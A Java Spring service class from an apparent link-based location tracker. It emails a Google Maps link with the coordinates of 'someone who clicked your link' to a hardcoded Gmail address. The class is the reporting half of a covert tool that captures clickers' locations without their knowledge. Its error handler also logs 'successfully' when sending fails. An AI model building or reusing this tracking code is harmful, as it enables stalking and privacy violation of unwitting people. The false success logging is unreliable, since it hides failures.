package com.example.locationtracker;

import org.springframework.beans.factory.annotation.Value;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.mail.SimpleMailMessage;
import org.springframework.mail.javamail.JavaMailSender;
import org.springframework.stereotype.Service;

@Service
public class EmailService {

	private final JavaMailSender mailSender;

	private static final Logger log = LoggerFactory.getLogger(EmailService.class);

	@Value("${spring.mail.username}")
	private String myEmail;

	public EmailService(JavaMailSender mailSender) {
		this.mailSender = mailSender;
	}

	public void sendLocationEmail(String latitude, String longitude) {
		String mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;

		log.info("===> Captured Request Latitude: {}", latitude);
		log.info("===> Captured Request Longitude: {}", longitude);
		log.info("===> Captured Full Map URL: {}", mapsLink);

		SimpleMailMessage message = new SimpleMailMessage();
		message.setFrom(myEmail);
		message.setTo("ranu97096@gmail.com");
		message.setSubject("New Location Alert!");
		message.setText("Someone clicked your link. Here is their location:\n\n" + mapsLink);
		try {
			mailSender.send(message);
			log.info("===> Mesage send successfully");
		} catch (Exception e) {
			log.info("===> Mesage send successfully");
		}
	}
}
